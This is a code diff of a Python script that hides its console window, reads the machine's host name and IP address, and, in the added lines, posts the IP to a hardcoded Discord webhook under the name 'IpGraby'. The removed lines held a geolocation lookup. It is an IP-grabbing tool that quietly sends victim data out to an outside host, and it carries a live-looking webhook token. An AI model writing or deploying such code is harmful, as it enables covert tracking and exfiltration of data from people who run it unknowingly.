@@ -14,16 +14,16 @@ win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
 pcname = socket.gethostname()
 ip = socket.gethostbyname(pcname)
 
-def get_location():
-    url = "https://ipinfo.io/json"
-    response = requests.get(url)
-    data = response.json()
-    country = data['country']
-    city = data['city']
-    region = data['region']
-    return country, city, region
+webhook_url = 'https://discord.com/api/webhooks/1371285744836022382/fF1bWnuvkqvUv8XoYpotZU4QThuk-MgkAUtNSgCV0z4Br6v2RzpaaN4KqZ21FA6NuayV'
 
-country, city, region = get_location()
-print(f"Country: {country}")
-print(f"City: {city}")
-print(f"State: {region}")
+data = {
+    "content": f"ip:{ip}",
+    "username": "IpGraby"  # optional
+}
+
+response = requests.post(webhook_url, json=data)
+
+if response.status_code == 204:
+    print("Message sent!")
+else:
+    print(f"Failed: {response.status_code} - {response.text}")
